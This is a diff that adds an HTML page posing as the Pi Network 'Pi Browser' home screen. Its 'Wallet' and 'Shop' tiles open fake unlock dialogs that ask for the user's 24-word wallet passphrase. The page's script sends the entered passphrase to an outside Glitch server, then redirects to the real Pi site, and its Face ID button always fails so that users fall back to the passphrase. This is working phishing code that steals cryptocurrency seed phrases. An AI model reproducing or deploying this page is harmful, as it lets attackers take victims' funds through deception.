@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="HandheldFriendly" content="true">
+    <title>Pi Browser</title>
+    <style>
+        /* New Header Styles */
+        .main-header {
+            background-color: #6d318d;
+            width: 100%;
+            padding: 15px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            gap: 10px;
+        }
+        .header-icon {
+            width: 30px;
+            height: 30px;
+        }
+        .header-title {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            overflow-y: auto;
+            -webkit-text-size-adjust: 100%;
+        }
+        body.modal-open {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        .top-image {
+            margin-top: 15px;
+            width: 100px;
+            height: auto;
+        }
+        .title {
+            margin-top: 30px;
+            font-size: 24px;
+            color: #ffb44c;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(3, 110px);
+            grid-template-rows: repeat(3, 110px);
+            gap: 8px;
+            margin: 60px 0 20px 0;
+        }
+        .grid-item {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            background-color: transparent;
+        }
+        .grid-item img {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            transition: transform 0.3s ease;
+        }
+        .grid-item:hover img {
+            transform: scale(1.1);
+        }
+        .grid-item:active img {
+            transform: scale(0.95);
+        }
+        .grid-item-name {
+            margin-top: 2px;
+            font-size: 14px;
+            font-weight: bold;
+            color: #6d318d;
+            text-align: center;
+        }
+        .blank-space {
+            height: 150px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .blank-space button {
+            padding: 12px 50px;
+            font-size: 16px;
+            background-color: #6d318d;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .blank-space button:hover {
+            background-color: #5a2a6d;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 1000;
+            -webkit-overflow-scrolling: touch;
+            overflow-y: auto;
+        }
+        .modal-content {
+            width: 100%;
+            min-height: 100%;
+            padding: 15px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .modal-inner {
+            max-width: 450px;
+            width: 90%;
+            margin: 0 auto;
+            padding-top: 60px; /* Reduced padding */
+            transform: translateZ(0);
+        }
+        /* Header Bar Styles */
+        .modal-header-bar {
+            background-color: #6d318d;
+            height: 76px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1001;
+        }
+        .modal-header-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            width: 100%;
+        }
+        .modal-header-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+        .modal-header-title {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0;
+        }
+        .modal-content h2 {
+            color: black;
+            margin: 20px 0 15px 0;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .modal-content textarea {
+            width: 100%;
+            height: 250px;
+            padding: 15px;
+            margin: 0 0 15px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            resize: none;
+            font-size: 16px;
+            font-weight: 500;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+        }
+        .modal-content textarea:focus {
+            outline: none;
+            border-color: #6d318d;
+            background-color: white;
+        }
+        .unlock-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        .unlock-options button {
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .passphrase {
+            background: white;
+            color: #6d318d;
+            border: 2px solid #6d318d;
+        }
+        .passphrase:hover {
+            background: #f5f0fa;
+        }
+        .face-id {
+            background: #6d318d;
+            color: white;
+            border: none;
+        }
+        .face-id:hover {
+            background: #5a2a6d;
+        }
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin: -10px 0 10px 0;
+            font-weight: bold;
+            display: none;
+            text-align: center;
+        }
+        .info-message {
+            margin: 15px 0;
+            font-size: 14px;
+            color: #555;
+            line-height: 1.4;
+        }
+        .info-message a {
+            color: #1e81b0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .info-message a:hover {
+            text-decoration: underline;
+        }
+        .back-icon {
+            position: absolute;
+            top: 12px;
+            left: 15px;
+            font-size: 28px;
+            cursor: pointer;
+            color: white;
+            background: none;
+            border: none;
+            padding: 8px;
+            z-index: 1002;
+        }
+        .back-icon:hover {
+            background-color: rgba(245, 240, 250, 0.5);
+            border-radius: 50%;
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #6d318d;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- New Header -->
+    <header class="main-header">
+        <img src="home-icon.png" alt="Home Icon" class="header-icon">
+        <h1 class="header-title">Home</h1>
+    </header>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Done...</p>
+    </div>
+
+    <img src="pilogo.png" alt="Pi Logo" class="top-image">
+    <h1 class="title">Welcome to the Pi Browser</h1>
+
+    <div class="grid-container">
+        <div class="grid-item" onclick="window.location.href='https://fireside.pinet.com/me'">
+            <img src="fireside.png" alt="Fire Side">
+            <div class="grid-item-name">Fireside</div>
+        </div>
+        <div class="grid-item" onclick="showModal('wallet')">
+            <img src="wallet.png" alt="Wallet">
+            <div class="grid-item-name">Wallet</div>
+        </div>
+        <div class="grid-item" onclick="showModal('brainstorm')">
+            <img src="brainstorm.png" alt="Brainstorm">
+            <div class="grid-item-name">Shop</div>
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://mine.pinet.com'">
+            <img src="mine.png" alt="Mine">
+            <div class="grid-item-name">Mine</div>
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://blockexplorer.minepi.com'">
+            <img src="blockchain.jpg" alt="Blockchain">
+            <div class="grid-item-name">Blockchain</div>
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://develop.pinet.com'">
+            <img src="develop.png" alt="Develop">
+            <div class="grid-item-name">Develop</div>
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://kyc.pinet.com'">
+            <img src="kyc.png" alt="KYC">
+            <div class="grid-item-name">KYC</div>
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://chat.pinet.com'">
+            <img src="chat.jpg" alt="Chat">
+            <div class="grid-item-name">Chat</div>
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://profiles.pinet.com'">
+            <img src="profile.png" alt="Profile">
+            <div class="grid-item-name">Profile</div>
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-header-bar">
+            <button class="back-icon" onclick="hideModal('walletModal')">←</button>
+            <div class="modal-header-content">
+                <img src="home.png" alt="Home" class="modal-header-icon">
+                <h3 class="modal-header-title">Wallet</h3>
+            </div>
+        </div>
+        <div class="modal-content">
+            <div class="modal-inner">
+                <h2>Unlock Pi Wallet</h2>
+                <textarea id="walletPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+                <div class="error-message" id="walletErrorMessage">Invalid passphrase.</div>
+                <div class="unlock-options">
+                    <button class="passphrase" onclick="validatePassphrase('walletPassphraseInput', 'walletErrorMessage')">Unlock With Passphrase</button>
+                    <button class="face-id" onclick="showFaceIDError()">Unlock With Face ID</button>
+                </div>
+                <div class="info-message">
+                    <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                    <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Brainstorm Modal -->
+    <div class="modal-overlay" id="brainstormModal">
+        <div class="modal-header-bar">
+            <button class="back-icon" onclick="hideModal('brainstormModal')">←</button>
+            <div class="modal-header-content">
+                <img src="home.png" alt="Home" class="modal-header-icon">
+                <h3 class="modal-header-title">Wallet</h3>
+            </div>
+        </div>
+        <div class="modal-content">
+            <div class="modal-inner">
+                <h2>Unlock Pi Wallet</h2>
+                <textarea id="brainstormPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+                <div class="error-message" id="brainstormErrorMessage">Invalid passphrase.</div>
+                <div class="unlock-options">
+                    <button class="passphrase" onclick="validatePassphrase('brainstormPassphraseInput', 'brainstormErrorMessage')">Unlock With Passphrase</button>
+                    <button class="face-id" onclick="showFaceIDError()">Unlock With Face ID</button>
+                </div>
+                <div class="info-message">
+                    <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                    <p>Lost your passphrase? <a href="#" onclick="redirectToNewAccount()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="blank-space">
+        <button onclick="window.location.href='https://ecosystem.pinet.com'">EXPLORE THE ECOSYSTEM</button>
+    </div>
+
+    <script>
+        async function validatePassphrase(inputId, errorId) {
+            const input = document.getElementById(inputId);
+            const error = document.getElementById(errorId);
+            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
+
+            if (words.length !== 24) {
+                error.style.display = 'block';
+                error.textContent = 'Passphrase must be 24 words';
+                return;
+            }
+
+            error.style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            try {
+                const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ passphrase: input.value })
+                });
+
+                if (response.status === 429) {
+                    alert("Server overloaded. Please wait before trying again.");
+                    return;
+                }
+
+                const result = await response.json();
+                if (result.success) window.location.href = "https://minepi.com";
+            } catch (e) {
+                alert("Connection error. Try again later.");
+            } finally {
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+
+        function showModal(modalType) {
+            document.body.classList.add('modal-open');
+            const modalId = `${modalType}Modal`;
+            document.getElementById(modalId).style.display = "flex";
+            
+            // Scroll modal content to top to ensure input is visible
+            setTimeout(() => {
+                document.getElementById(modalId).scrollTop = 0;
+            }, 50);
+        }
+        
+        function hideModal(modalId) {
+            document.body.classList.remove('modal-open');
+            document.getElementById(modalId).style.display = "none";
+        }
+        
+        function showFaceIDError() {
+            alert("Face ID is not available at the moment. Please try with passphrase.");
+        }
+        
+        function redirectToNewWallet() {
+            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
+                window.location.href = "https://example.com/create-new-wallet";
+            }
+        }
+        
+        function redirectToNewAccount() {
+            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
+                window.location.href = "https://example.com/create-new-brainstorm-account";
+            }
+        }
+
+        // Handle input focus to prevent scrolling
+        document.addEventListener('DOMContentLoaded', function() {
+            const textareas = document.querySelectorAll('.modal-content textarea');
+            textareas.forEach(textarea => {
+                textarea.addEventListener('focus', function() {
+                    // Prevent default scrolling behavior
+                    window.scrollTo(0, 0);
+                    document.body.scrollTop = 0;
+                    
+                    // Ensure the input stays in view
+                    setTimeout(() => {
+                        const modalContent = this.closest('.modal-content');
+                        if (modalContent) {
+                            const inputRect = this.getBoundingClientRect();
+                            const modalRect = modalContent.getBoundingClientRect();
+                            const offset = inputRect.top - modalRect.top - 100;
+                            modalContent.scrollTop = offset > 0 ? offset : 0;
+                        }
+                    }, 100);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
